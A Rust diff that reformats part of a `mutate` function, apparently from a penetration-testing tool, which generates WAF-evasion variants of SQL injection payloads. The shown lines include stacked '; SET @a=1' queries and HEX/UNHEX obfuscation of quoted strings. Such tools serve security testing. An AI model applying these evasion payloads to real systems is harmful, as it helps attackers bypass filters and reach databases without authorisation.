@@ -55,7 +55,10 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
     // ── @variable injection ──
     // Set a variable then use it — WAFs don't track variable state
     if lower.contains("' or ") || lower.contains("' and ") {
-        results.push(format!("'; SET @a=1; SELECT @a;{}", payload.split("--").last().unwrap_or("")));
+        results.push(format!(
+            "'; SET @a=1; SELECT @a;{}",
+            payload.split("--").last().unwrap_or("")
+        ));
     }
 
     // ── Charset function obfuscation ──
@@ -66,18 +69,19 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
     // ── HEX/UNHEX string construction ──
     // Construct 'admin' as UNHEX('61646D696E')
     if let Some(start) = payload.find('\'')
-        && let Some(end) = payload[start + 1..].find('\'') {
-            let inner = &payload[start + 1..start + 1 + end];
-            if !inner.is_empty() && inner.len() <= 20 {
-                let hex: String = inner.bytes().map(|b| format!("{b:02x}")).collect();
-                results.push(format!(
-                    "{}UNHEX('{}'){}",
-                    &payload[..start],
-                    hex,
-                    &payload[start + 1 + end + 1..]
-                ));
-            }
+        && let Some(end) = payload[start + 1..].find('\'')
+    {
+        let inner = &payload[start + 1..start + 1 + end];
+        if !inner.is_empty() && inner.len() <= 20 {
+            let hex: String = inner.bytes().map(|b| format!("{b:02x}")).collect();
+            results.push(format!(
+                "{}UNHEX('{}'){}",
+                &payload[..start],
+                hex,
+                &payload[start + 1 + end + 1..]
+            ));
         }
+    }
 
     // ── Information schema enumeration payloads ──
     if results.len() < max_mutations {
